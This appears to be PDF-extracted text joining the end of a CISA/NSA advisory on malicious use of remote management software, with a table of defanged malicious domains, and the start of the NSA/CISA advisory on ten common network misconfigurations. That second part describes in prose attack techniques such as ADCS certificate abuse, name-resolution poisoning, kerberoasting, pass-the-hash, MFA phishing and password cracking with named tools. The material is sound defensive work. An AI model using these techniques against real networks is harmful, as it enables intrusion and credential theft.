providers (MSPs) and IT help desks, who regularly use legitimate RMM software for technical and
security end-user support, network management, endpoint monitoring, and to interact remotely with
hosts for IT-support functions. These threat actors can exploit trust relationships in MSP networks and
gain access to a large number of the victim MSP's customers. MSP compromises can introduce
significant risk
such as ransomware and cyber espionage
to the MSP
s customers.
The authoring organizations strongly encourage network defenders to apply the recommendations in
the Mitigations section of this CSA to protect against malicious use of legitimate RMM software.
Page 4 of 7 | Product ID: AA23-025A
TLP:CLEAR
TLP:CLEAR
CISA | NSA | MS-ISAC
INDICATORS OF COMPROMISE
See table 1 for IOCs associated with the campaign detailed in this CSA.
Table 1: Malicious Domains and IP addresses observed by CISA
Domain
Description
Date(s) Observed
win03[.]xyz
Suspected first-stage
malware domain
June 1, 2022
myhelpcare[.]online
Suspected first-stage
malware domain
June 14, 2022
win01[.]xyz
Suspected first-stage
malware domain
August 3, 2022
myhelpcare[.]cc
Suspected first-stage
malware domain
September 14, 2022
247secure[.]us
Second-stage malicious
domain
October 19, 2022
July 19, 2022
August 18, 2022
November 10, 2022
Additional resources to detect possible exploitation or compromise:
Silent Push: Silent Push uncovers a large trojan operation featuring Amazon, Microsoft, Geek
Squad, McAfee, Norton, and Paypal domains.
Page 5 of 7 | Product ID: AA23-025A
TLP:CLEAR
TLP:CLEAR
CISA | NSA | MS-ISAC
MITIGATIONS
The authoring organizations encourage network defenders to:
Implement best practices to block phishing emails. See CISA
s Phishing Infographic for more
information.
Audit remote access tools on your network to identify currently used and/or authorized RMM
software.
Review logs for execution of RMM software to detect abnormal use of programs running as a
portable executable.
Use security software to detect instances of RMM software only being loaded in memory.
Implement application controls to manage and control execution of software, including
allowlisting RMM programs.
 See NSA Cybersecurity Information sheet Enforce Signed Software Execution
Policies.
 Application controls should prevent both installation and execution of portable versions
of unauthorized RMM software.
Require authorized RMM solutions only be used from within your network over approved
remote access solutions, such as virtual private networks (VPNs) or virtual desktop interfaces
(VDIs).
Block both inbound and outbound connections on common RMM ports and protocols at the
network perimeter.
Implement a user training program and phishing exercises to raise awareness among users
about the risks of visiting suspicious websites, clicking on suspicious links, and opening
suspicious attachments. Reinforce the appropriate user response to phishing and
spearphishing emails.
RESOURCES
See CISA Insights Mitigations and Hardening Guidance for MSPs and Small- and Mid-sized
Businesses for guidance on hardening MSP and customer infrastructure.
U.S. Defense Industrial Base (DIB) Sector organizations may consider signing up for the NSA
Cybersecurity Collaboration Center
s DIB Cybersecurity Service Offerings, including
Protective Domain Name System (PDNS) services, vulnerability scanning, and threat
intelligence collaboration for eligible organizations. For more information on how to enroll in
these services, email dib_defense@cyber.nsa.gov.
CISA offers several Vulnerability Scanning to help organizations reduce their exposure to
threats by taking a proactive approach to mitigating attack vectors. See cisa.gov/cyberhygiene-services.
Consider participating in CISA
s Automated Indicator Sharing (AIS) to receive real-time
exchange of machine-readable cyber threat indicators and defensive measures. AIS is offered
at no cost to participants as part of CISA
s mission to work with our public and private sector
Page 6 of 7 | Product ID: AA23-025A
TLP:CLEAR
TLP:CLEAR
CISA | NSA | MS-ISAC
partners to identify and help mitigate cyber threats through information sharing and provide
technical assistance, upon request, that helps prevent, detect, and respond to incidents.
REFERENCES
[1] Silent Push uncovers a large trojan operation featuring Amazon, Microsoft, Geek Squad, McAfee,
Norton, and Paypal domains. 
 Silent Push Threat Intelligence
[2] Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base
Organization | CISA
[3] Iranian Government-Sponsored Actors Conduct Cyber Operations Against Global Government
and Commercial Networks | CISA
[4] Karakurt Data Extortion Group | CISA
[5] Compromise of U.S. Water Treatment Facility | CISA
[6] North Korean Advanced Persistent Threat Focus: Kimsuky | CISA
[7] Continued Threat Actor Exploitation Post Pulse Secure VPN Patching | CISA
[8] FBI Warns Public to Beware of Tech Support Scammers Targeting Financial Accounts Using
Remote Desktop Software 
 FBI
PURPOSE
This advisory was developed by CISA, NSA, and MS-ISAC in furtherance of their respective
cybersecurity missions, including their responsibilities to develop and issue cybersecurity
specifications and mitigations.
DISCLAIMER
The information in this report is being provided 
as is
 for informational purposes only. CISA, NSA,
and MS-ISAC do not endorse any commercial product or service, including any subjects of analysis.
Any reference to specific commercial products, processes, or services by service mark, trademark,
manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring.
Page 7 of 7 | Product ID: AA23-025A
TLP:CLEAR
National
Security
Agency
Cybersecurity and
Infrastructure
Security
Agency
| Joint Cybersecurity Advisory
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten
Cybersecurity Misconfigurations
A plea for network defenders and software manufacturers to fix common problems.
Executive summary
The National Security Agency (NSA) and Cybersecurity and Infrastructure Security
Agency (CISA) are releasing this joint cybersecurity advisory (CSA) to highlight the
most common cybersecurity misconfigurations in large organizations, and detail the
tactics, techniques, and procedures (TTPs) actors use to exploit these
misconfigurations.
Through NSA and CISA Red and Blue team assessments, as well as through the
activities of NSA and CISA Hunt and Incident Response teams, the agencies identified
the following 10 most common network misconfigurations:
Default configurations of software and applications
Improper separation of user/administrator privilege
Insufficient internal network monitoring
Lack of network segmentation
Poor patch management
Bypass of system access controls
Weak or misconfigured multifactor authentication (MFA) methods
Insufficient access control lists (ACLs) on network shares and services
Poor credential hygiene
Unrestricted code execution
These misconfigurations illustrate (1) a trend of systemic weaknesses in many large
organizations, including those with mature cyber postures, and (2) the importance of
software manufacturers embracing secure-by-design principles to reduce the burden on
network defenders:
Properly trained, staffed, and funded network security teams can implement the
known mitigations for these weaknesses.
This information is marked TLP:CLEAR. Recipients may share this information without restriction. Information is
subject to standard copyright rules. For more information on the Traffic Light Protocol, see cisa.gov/tlp/.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Software manufacturers must reduce the prevalence of these
misconfigurations
thus strengthening the security posture for customers
incorporating secure-by-design and -default principles and tactics into their
software development practices.[1]
NSA and CISA encourage network defenders to implement the recommendations found
within the Mitigations section of this advisory
including the following
to reduce the
risk of malicious actors exploiting the identified misconfigurations.
Remove default credentials and harden configurations.
Disable unused services and implement access controls.
Update regularly and automate patching, prioritizing patching of known exploited
vulnerabilities.[2]
Reduce, restrict, audit, and monitor administrative accounts and privileges.
NSA and CISA urge software manufacturers to take ownership of improving security
outcomes of their customers by embracing secure-by-design and-default tactics,
including:
Embedding security controls into product architecture from the start of
development and throughout the entire software development lifecycle (SDLC).
Eliminating default passwords.
Providing high-quality audit logs to customers at no extra charge.
Mandating MFA, ideally phishing-resistant, for privileged users and making MFA
a default rather than opt-in feature.[3]
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Contents
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations . 1
Executive summary ......................................................................................................... 1
Technical details ............................................................................................................. 6
Overview...................................................................................................................... 6
1. Default configurations of software and applications ................................................. 7
Default credentials ................................................................................................... 7
Default service permissions and configuration settings ............................................ 8
2. Improper separation of user/administrator privilege ................................................. 9
Excessive account privileges ................................................................................. 10
Elevated service account permissions ................................................................... 10
Non-essential use of elevated accounts ................................................................. 11
3. Insufficient internal network monitoring.................................................................. 11
4. Lack of network segmentation ............................................................................... 12
5. Poor patch management ....................................................................................... 12
Lack of regular patching ......................................................................................... 12
Use of unsupported OSs and outdated firmware ................................................... 13
6. Bypass of system access controls ......................................................................... 13
7. Weak or misconfigured MFA methods ................................................................... 13
Misconfigured smart cards or tokens ..................................................................... 13
Lack of phishing-resistant MFA .............................................................................. 14
8. Insufficient ACLs on network shares and services ................................................ 14
9. Poor credential hygiene ......................................................................................... 15
Easily crackable passwords ................................................................................... 15
Cleartext password disclosure ............................................................................... 16
10. Unrestricted code execution ................................................................................ 16
Mitigations ..................................................................................................................... 17
Network defenders .................................................................................................... 17
Mitigate default configurations of software and applications .................................. 17
Mitigate improper separation of user/administrator privilege .................................. 19
Mitigate insufficient internal network monitoring ..................................................... 20
Mitigate lack of network segmentation ................................................................... 21
Mitigate poor patch management ........................................................................... 22
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Mitigate bypass of system access controls ............................................................ 23
Mitigate weak or misconfigured MFA methods....................................................... 24
Mitigate insufficient ACLs on network shares and services .................................... 25
Mitigate poor credential hygiene ............................................................................ 25
Mitigate unrestricted code execution ...................................................................... 27
Software manufacturers............................................................................................. 28
Validate security controls .............................................................................................. 32
Learn from history ......................................................................................................... 32
Works cited ................................................................................................................... 33
Appendix: MITRE ATT&CK tactics and techniques ....................................................... 37
Tables
Table 1: Recommendations for network defenders to mitigate default configurations of
software and applications .............................................................................................. 17
Table 2: Recommendations for network defenders to mitigate improper separation of
user/administrator privilege ........................................................................................... 19
Table 3: Recommendations for network defenders to mitigate insufficient internal
network monitoring ........................................................................................................ 20
Table 4: Recommendations for network defenders to mitigate lack of network
segmentation ................................................................................................................. 21
Table 5: Recommendations for network defenders to mitigate poor patch management
...................................................................................................................................... 22
Table 6: Recommendations for network defenders to mitigate bypass of system access
controls.......................................................................................................................... 23
Table 7: Recommendations for network defenders to mitigate weak or misconfigured
MFA methods ................................................................................................................ 24
Table 8: Recommendations for network defenders to mitigate insufficient ACLs on
network shares and services ......................................................................................... 25
Table 9: Recommendations for network defenders to mitigate poor credential hygiene 25
Table 10: Recommendations for network defenders to mitigate unrestricted code
execution ....................................................................................................................... 27
Table 11: Recommendations for software manufacturers to mitigate identified
misconfigurations .......................................................................................................... 28
Table 12: ATT&CK Techniques for Enterprise 
 Reconnaissance ................................ 37
Table 13: ATT&CK Techniques for Enterprise 
 Initial Access ..................................... 37
Table 14: ATT&CK Techniques for Enterprise 
 Execution........................................... 38
Table 15: ATT&CK Techniques for Enterprise 
 Persistence........................................ 39
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Table 16: ATT&CK Techniques for Enterprise 
 Privilege Escalation ........................... 39
Table 17: ATT&CK Techniques for Enterprise 
 Defense Evasion ............................... 40
Table 18: ATT&CK Techniques for Enterprise 
 Credential Access ............................. 40
Table 19: ATT&CK Techniques for Enterprise 
 Discovery........................................... 42
Table 20: ATT&CK Techniques for Enterprise 
 Lateral Movement .............................. 43
Table 21: ATT&CK Techniques for Enterprise 
 Collection........................................... 43
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Technical details
Note: This advisory uses the MITRE ATT&CK
 for Enterprise framework, version 13,
and the MITRE D3FEND
 cybersecurity countermeasures framework.[4],[5] See the
Appendix: MITRE ATT&CK tactics and techniques section for tables summarizing the
threat actors
 activity mapped to MITRE ATT&CK tactics and techniques, and the
Mitigations section for MITRE D3FEND countermeasures.
For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework,
see CISA and MITRE ATT&CK
s Best Practices for MITRE ATT&CK Mapping and
CISA
s Decider Tool.[6],[7]
Overview
Over the years, the following NSA and CISA teams have assessed the security posture
of many network enclaves across the Department of Defense (DoD); Federal Civilian
Executive Branch (FCEB); state, local, tribal, and territorial (SLTT) governments; and
the private sector:
Depending on the needs of the assessment, NSA Defensive Network Operations
(DNO) teams feature capabilities from Red Team (adversary emulation), Blue
Team (strategic vulnerability assessment), Hunt (targeted hunt), and/or Tailored
Mitigations (defensive countermeasure development).
CISA Vulnerability Management (VM) teams have assessed the security posture
of over 1,000 network enclaves. CISA VM teams include Risk and Vulnerability
Assessment (RVA) and CISA Red Team Assessments (RTA).[8] The RVA team
conducts remote and onsite assessment services, including penetration testing
and configuration review. RTA emulates cyber threat actors in coordination with
an organization to assess the organization
s cyber detection and response
capabilities.
CISA Hunt and Incident Response teams conduct proactive and reactive
engagements, respectively, on organization networks to identify and detect cyber
threats to U.S. infrastructure.
During these assessments, NSA and CISA identified the 10 most common network
misconfigurations, which are detailed below. These misconfigurations (non-prioritized)
are systemic weaknesses across many networks.
Many of the assessments were of Microsoft
 Windows
 and Active Directory
environments. This advisory provides details about, and mitigations for, specific issues
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
found during these assessments, and so mostly focuses on these products. However, it
should be noted that many other environments contain similar misconfigurations.
Network owners and operators should examine their networks for similar
misconfigurations even when running other software not specifically mentioned below.
1. Default configurations of software and applications
Default configurations of systems, services, and applications can permit unauthorized
access or other malicious activity. Common default configurations include:
Default credentials
Default service permissions and configurations settings
Default credentials
Many software manufacturers release commercial off-the-shelf (COTS) network devices
which provide user access via applications or web portals
containing predefined
default credentials for their built-in administrative accounts.[9] Malicious actors and
assessment teams regularly abuse default credentials by:
Finding credentials with a simple web search [T1589.001] and using them
[T1078.001] to gain authenticated access to a device.
Resetting built-in administrative accounts [T1098] via predictable forgotten
passwords questions.
Leveraging default virtual private network (VPN) credentials for internal network
access [T1133].
Leveraging publicly available setup information to identify built-in administrative
credentials for web applications and gaining access to the application and its
underlying database.
Leveraging default credentials on software deployment tools [T1072] for code
execution and lateral movement.
In addition to devices that provide network access, printers, scanners, security cameras,
conference room audiovisual (AV) equipment, voice over internet protocol (VoIP)
phones, and internet of things (IoT) devices commonly contain default credentials that
can be used for easy unauthorized access to these devices as well. Further
compounding this problem, printers and scanners may have privileged domain accounts
loaded so that users can easily scan documents and upload them to a shared drive or
email them. Malicious actors who gain access to a printer or scanner using default
credentials can use the loaded privileged domain accounts to move laterally from the
device and compromise the domain [T1078.002].
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Default service permissions and configuration settings
Certain services may have overly permissive access controls or vulnerable
configurations by default. Additionally, even if the providers do not enable these
services by default, malicious actors can easily abuse these services if users or
administrators enable them.
Assessment teams regularly find the following:
Insecure Active Directory Certificate Services
Insecure legacy protocols/services
Insecure Server Message Block (SMB) service
Insecure Active Directory Certificate Services
Active Directory Certificate Services (ADCS) is a feature used to manage Public Key
Infrastructure (PKI) certificates, keys, and encryption inside of Active Directory (AD)
environments. ADCS templates are used to build certificates for different types of
servers and other entities on an organization
s network.
Malicious actors can exploit ADCS and/or ADCS template misconfigurations to
manipulate the certificate infrastructure into issuing fraudulent certificates and/or
escalate user privileges to domain administrator privileges. These certificates and
domain escalation paths may grant actors unauthorized, persistent access to systems
and critical data, the ability to impersonate legitimate entities, and the ability to bypass
security measures.
Assessment teams have observed organizations with the following misconfigurations:
ADCS servers running with web-enrollment enabled. If web-enrollment is
enabled, unauthenticated actors can coerce a server to authenticate to an actorcontrolled computer, which can relay the authentication to the ADCS webenrollment service and obtain a certificate [T1649] for the server
s account.
These fraudulent, trusted certificates enable actors to use adversary-in-themiddle techniques [T1557] to masquerade as trusted entities on the network. The
actors can also use the certificate for AD authentication to obtain a Kerberos
Ticket Granting Ticket (TGT) [T1558.001], which they can use to compromise the
server and usually the entire domain.
ADCS templates where low-privileged users have enrollment rights, and
the enrollee supplies a subject alternative name. Misconfiguring various
elements of ADCS templates can result in domain escalation by unauthorized
users (e.g., granting low-privileged users certificate enrollment rights, allowing
requesters to specify a subjectAltName in the certificate signing request [CSR],
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
not requiring authorized signatures for CSRs, granting FullControl or
WriteDacl permissions to users). Malicious actors can use a low-privileged user
account to request a certificate with a particular Subject Alternative Name (SAN)
and gain a certificate where the SAN matches the User Principal Name (UPN) of
a privileged account.
Note: For more information on known escalation paths, including PetitPotam NTLM
relay techniques, see: Domain Escalation: PetitPotam NTLM Relay to ADCS Endpoints
and Certified Pre-Owned. Active Directory Certificate Services.[10],[11],[12]
Insecure legacy protocols/services
Many vulnerable network services are enabled by default, and assessment teams have
observed them enabled in production environments. Specifically, assessment teams
have observed Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name
Service (NBT-NS), which are Microsoft Windows components that serve as alternate
methods of host identification. If these services are enabled in a network, actors can
use spoofing, poisoning, and relay techniques [T1557.001] to obtain domain hashes,
system access, and potential administrative system sessions. Malicious actors
frequently exploit these protocols to compromise entire Windows
 environments.
Malicious actors can spoof an authoritative source for name resolution on a target
network by responding to passing traffic, effectively poisoning the service so that target
computers will communicate with an actor-controlled system instead of the intended
one. If the requested system requires identification/authentication, the target computer
will send the user
s username and hash to the actor-controlled system. The actors then
collect the hash and crack it offline to obtain the plain text password [T1110.002].
Insecure Server Message Block (SMB) service
The Server Message Block service is a Windows component primarily for file sharing.
Its default configuration, including in the latest version of Windows, does not require
signing network messages to ensure authenticity and integrity. If SMB servers do not
enforce SMB signing, malicious actors can use machine-in-the-middle techniques, such
as NTLM relay. Further, malicious actors can combine a lack of SMB signing with the
name resolution poisoning issue (see above) to gain access to remote systems
[T1021.002] without needing to capture and crack any hashes.
2. Improper separation of user/administrator privilege
Administrators often assign multiple roles to one account. These accounts have access
to a wide range of devices and services, allowing malicious actors to move through a
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
network quickly with one compromised account without triggering lateral movement
and/or privilege escalation detection measures.
Assessment teams have observed the following common account separation
misconfigurations:
Excessive account privileges
Elevated service account permissions
Non-essential use of elevated accounts
Excessive account privileges
Account privileges are intended to control user access to host or application resources
to limit access to sensitive information or enforce a least-privilege security model. When
account privileges are overly permissive, users can see and/or do things they should
not be able to, which becomes a security issue as it increases risk exposure and attack
surface.
Expanding organizations can undergo numerous changes in account management,
personnel, and access requirements. These changes commonly lead to privilege
creep
the granting of excessive access and unnecessary account privileges. Through
the analysis of topical and nested AD groups, a malicious actor can find a user account
[T1078] that has been granted account privileges that exceed their need-to-know or
least-privilege function. Extraneous access can lead to easy avenues for unauthorized
access to data and resources and escalation of privileges in the targeted domain.
Elevated service account permissions
Applications often operate using user accounts to access resources. These user
accounts, which are known as service accounts, often require elevated privileges. When
a malicious actor compromises an application or service using a service account, they
will have the same privileges and access as the service account.
Malicious actors can exploit elevated service permissions within a domain to gain
unauthorized access and control over critical systems. Service accounts are enticing
targets for malicious actors because such accounts are often granted elevated
permissions within the domain due to the nature of the service, and because access to
use the service can be requested by any valid domain user. Due to these factors,
kerberoasting
a form of credential access achieved by cracking service account
credentials
is a common technique used to gain control over service account targets
[T1558.003].
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Non-essential use of elevated accounts
IT personnel use domain administrator and other administrator accounts for system and
network management due to their inherent elevated privileges. When an administrator
account is logged into a compromised host, a malicious actor can steal and use the
account's credentials and an AD-generated authentication token [T1528] to move, using
the elevated permissions, throughout the domain [T1550.001]. Using an elevated
account for normal day-to-day, non-administrative tasks increases the account
exposure and, therefore, its risk of compromise and its risk to the network.
Malicious actors prioritize obtaining valid domain credentials upon gaining access to a
network. Authentication using valid domain credentials allows the execution of
secondary enumeration techniques to gain visibility into the target domain and AD
structure, including discovery of elevated accounts and where the elevated accounts
are used [T1087].
Targeting elevated accounts (such as domain administrator or system administrators)
performing day-to-day activities provides the most direct path to achieve domain
escalation. Systems or applications accessed by the targeted elevated accounts
significantly increase the attack surface available to adversaries, providing additional
paths and escalation options.
After obtaining initial access via an account with administrative permissions, an
assessment team compromised a domain in under a business day. The team first
gained initial access to the system through phishing [T1566], by which they enticed the
end user to download [T1204] and execute malicious payloads. The targeted end-user
account had administrative permissions, enabling the team to quickly compromise the
entire domain.
3. Insufficient internal network monitoring
Some organizations do not optimally configure host and network sensors for traffic
collection and end-host logging. These insufficient configurations could lead to
undetected adversarial compromise. Additionally, improper sensor configurations limit
the traffic collection capability needed for enhanced baseline development and detract
from timely detection of anomalous activity.
Assessment teams have exploited insufficient monitoring to gain access to assessed
networks. For example:
An assessment team observed an organization with host-based monitoring, but
no network monitoring. Host-based monitoring informs defensive teams about
adverse activities on singular hosts and network monitoring informs about
adverse activities traversing hosts [TA0008]. In this example, the organization
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
could identify infected hosts but could not identify where the infection was coming
from, and thus could not stop future lateral movement and infections.
An assessment team gained persistent deep access to a large organization with
a mature cyber posture. The organization did not detect the assessment team
lateral movement, persistence, and command and control (C2) activity, including
when the team attempted noisy activities to trigger a security response. For more
information on this activity, see CSA CISA Red Team Shares Key Findings to
Improve Monitoring and Hardening of Networks.[13]
4. Lack of network segmentation
Network segmentation separates portions of the network with security boundaries. Lack
of network segmentation leaves no security boundaries between the user, production,
and critical system networks. Insufficient network segmentation allows an actor who has
compromised a resource on the network to move laterally across a variety of systems
uncontested. Lack of network segregation additionally leaves organizations significantly
more vulnerable to potential ransomware attacks and post-exploitation techniques.
Lack of segmentation between IT and operational technology (OT) environments places
OT environments at risk. For example, assessment teams have often gained access to
OT networks
despite prior assurance that the networks were fully air gapped, with no
possible connection to the IT network
by finding special purpose, forgotten, or even
accidental network connections [T1199].
5. Poor patch management
Vendors release patches and updates to address security vulnerabilities. Poor patch
management and network hygiene practices often enable adversaries to discover open
attack vectors and exploit critical vulnerabilities. Poor patch management includes:
Lack of regular patching
Use of unsupported operating systems (OSs) and outdated firmware
Lack of regular patching
Failure to apply the latest patches can leave a system open to compromise from
publicly available exploits. Due to their ease of discovery
via vulnerability scanning
[T1595.002] and open source research [T1592]
and exploitation, these systems are
immediate targets for adversaries. Allowing critical vulnerabilities to remain on
production systems without applying their corresponding patches significantly increases
the attack surface. Organizations should prioritize patching known exploited
vulnerabilities in their environments.[2]
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Assessment teams have observed threat actors exploiting many CVEs in public-facing
applications [T1190], including:
CVE-2019-18935 in an unpatched instance of Telerik
 UI for ASP.NET running
on a Microsoft IIS server.[14]
CVE-2021-44228 (Log4Shell) in an unpatched VMware
 Horizon server.[15]
CVE-2022-24682, CVE-2022-27924, and CVE-2022-27925 chained with CVE2022-37042, or CVE-2022-30333 in an unpatched Zimbra
 Collaboration
Suite.[16]
Use of unsupported OSs and outdated firmware
Using software or hardware that is no longer supported by the vendor poses a
significant security risk because new and existing vulnerabilities are no longer patched.
Malicious actors can exploit vulnerabilities in these systems to gain unauthorized
access, compromise sensitive data, and disrupt operations [T1210].
Assessment teams frequently observe organizations using unsupported Windows
operating systems without updates MS17-010 and MS08-67. These updates, released
years ago, address critical remote code execution vulnerabilities.[17],[18]
6. Bypass of system access controls
A malicious actor can bypass system access controls by compromising alternate
authentication methods in an environment. If a malicious actor can collect hashes in a
network, they can use the hashes to authenticate using non-standard means, such as
pass-the-hash (PtH) [T1550.002]. By mimicking accounts without the clear-text
password, an actor can expand and fortify their access without detection. Kerberoasting
is also one of the most time-efficient ways to elevate privileges and move laterally
throughout an organization
s network.
7. Weak or misconfigured MFA methods
Misconfigured smart cards or tokens
Some networks (generally government or DoD networks) require accounts to use smart
cards or tokens. Multifactor requirements can be misconfigured so the password hashes
for accounts never change. Even though the password itself is no longer used
because the smart card or token is required instead
there is still a password hash for
the account that can be used as an alternative credential for authentication. If the
password hash never changes, once a malicious actor has an account
s password hash
[T1111], the actor can use it indefinitely, via the PtH technique for as long as that
account exists.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Lack of phishing-resistant MFA
Some forms of MFA are vulnerable to phishing, 
push bombing
 [T1621], exploitation of
Signaling System 7 (SS7) protocol vulnerabilities, and/or 
SIM swap
 techniques. These
attempts, if successful, may allow a threat actor to gain access to MFA authentication
credentials or bypass MFA and access the MFA-protected systems. (See CISA
s Fact
Sheet Implementing Phishing-Resistant MFA for more information.)[3]
For example, assessment teams have used voice phishing to convince users to provide
missing MFA information [T1598]. In one instance, an assessment team knew a user
main credentials, but their login attempts were blocked by MFA requirements. The team
then masqueraded as IT staff and convinced the user to provide the MFA code over the
phone, allowing the team to complete their login attempt and gain access to the user
email and other organizational resources.
8. Insufficient ACLs on network shares and services
Data shares and repositories are primary targets for malicious actors. Network
administrators may improperly configure ACLs to allow for unauthorized users to access
sensitive or administrative data on shared drives.
Actors can use commands, open source tools, or custom malware to look for shared
folders and drives [T1135].
In one compromise, a team observed actors use the net share command
which displays information about shared resources on the local computer
the ntfsinfo command to search network shares on compromised computers.
In the same compromise, the actors used a custom tool, CovalentStealer, which
is designed to identify file shares on a system, categorize the files [T1083], and
upload the files to a remote server [TA0010].[19],[20]
Ransomware actors have used the SoftPerfect
 Network Scanner,
netscan.exe
which can ping computers [T1018], scan ports [T1046], and
discover shared folders
and SharpShares to enumerate accessible network
shares in a domain.[21],[22]
Malicious actors can then collect and exfiltrate the data from the shared drives and
folders. They can then use the data for a variety of purposes, such as extortion of the
organization or as intelligence when formulating intrusion plans for further network
compromise. Assessment teams routinely find sensitive information on network shares
[T1039] that could facilitate follow-on activity or provide opportunities for extortion.
Teams regularly find drives containing cleartext credentials [T1552] for service
accounts, web applications, and even domain administrators.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Even when further access is not directly obtained from credentials in file shares, there
can be a treasure trove of information for improving situational awareness of the target
network, including the network
s topology, service tickets, or vulnerability scan data. In
addition, teams regularly identify sensitive data and PII on shared drives (e.g., scanned
documents, social security numbers, and tax returns) that could be used for extortion or
social engineering of the organization or individuals.
9. Poor credential hygiene
Poor credential hygiene facilitates threat actors in obtaining credentials for initial access,
persistence, lateral movement, and other follow-on activity, especially if phishingresistant MFA is not enabled. Poor credential hygiene includes:
Easily crackable passwords
Cleartext password disclosure
Easily crackable passwords
Easily crackable passwords are passwords that a malicious actor can guess within a
short time using relatively inexpensive computing resources. The presence of easily
crackable passwords on a network generally stems from a lack of password length (i.e.,
shorter than 15 characters) and randomness (i.e., is not unique or can be guessed).
This is often due to lax requirements for passwords in organizational policies and user
training. A policy that only requires short and simple passwords leaves user passwords
susceptible to password cracking. Organizations should provide or allow employee use
of password managers to enable the generation and easy use of secure, random
passwords for each account.
Often, when a credential is obtained, it is a hash (one-way encryption) of the password
and not the password itself. Although some hashes can be used directly with PtH
techniques, many hashes need to be cracked to obtain usable credentials. The cracking
process takes the captured hash of the user
s plaintext password and leverages
dictionary wordlists and rulesets, often using a database of billions of previously
compromised passwords, in an attempt to find the matching plaintext password
[T1110.002].
One of the primary ways to crack passwords is with the open source tool, Hashcat,
combined with password lists obtained from publicly released password breaches. Once
a malicious actor has access to a plaintext password, they are usually limited only by
the account
s permissions. In some cases, the actor may be restricted or detected by
advanced defense-in-depth and zero trust implementations as well, but this has been a
rare finding in assessments thus far.
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Assessment teams have cracked password hashes for NTLM users, Kerberos service
account tickets, NetNTLMv2, and PFX stores [T1555], enabling the team to elevate
privileges and move laterally within networks. In 12 hours, one team cracked over 80%
of all users' passwords in an Active Directory, resulting in hundreds of valid credentials.
Cleartext password disclosure
Storing passwords in cleartext is a serious security risk. A malicious actor with access to
files containing cleartext passwords [T1552.001] could use these credentials to log into
the affected applications or systems under the guise of a legitimate user. Accountability
is lost in this situation as any system logs would record valid user accounts accessing
applications or systems.
Malicious actors search for text files, spreadsheets, documents, and configuration files
in hopes of obtaining cleartext passwords. Assessment teams frequently discover
cleartext passwords, allowing them to quickly escalate the emulated intrusion from the
compromise of a regular domain user account to that of a privileged account, such as a
Domain or Enterprise Administrator. A common tool used for locating cleartext
passwords is the open source tool, Snaffler.[23]
10. Unrestricted code execution
If unverified programs are allowed to execute on hosts, a threat actor can run arbitrary,
malicious payloads within a network.
Malicious actors often execute code after gaining initial access to a system. For
example, after a user falls for a phishing scam, the actor usually convinces the victim to
run code on their workstation to gain remote access to the internal network. This code is
usually an unverified program that has no legitimate purpose or business reason for
running on the network.
Assessment teams and malicious actors frequently leverage unrestricted code
execution in the form of executables, dynamic link libraries (DLLs), HTML applications,
and macros (scripts used in office automation documents) [T1059.005] to establish
initial access, persistence, and lateral movement. In addition, actors often use scripting
languages [T1059] to obscure their actions [T1027.010] and bypass allowlisting
where
organizations restrict applications and other forms of code by default and only allow
those that are known and trusted. Further, actors may load vulnerable drivers and then
exploit the drivers
 known vulnerabilities to execute code in the kernel with the highest
level of system privileges to completely compromise the device [T1068].
U/OO/208840-23 | PP-23-3322 | OCT 2023 Ver. 1.0
TLP:CLEAR
NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations
TLP:CLEAR
Mitigations
Network defenders
NSA and CISA recommend network defenders implement the recommendations that
follow to mitigate the issues identified in this advisory. These mitigations align with the
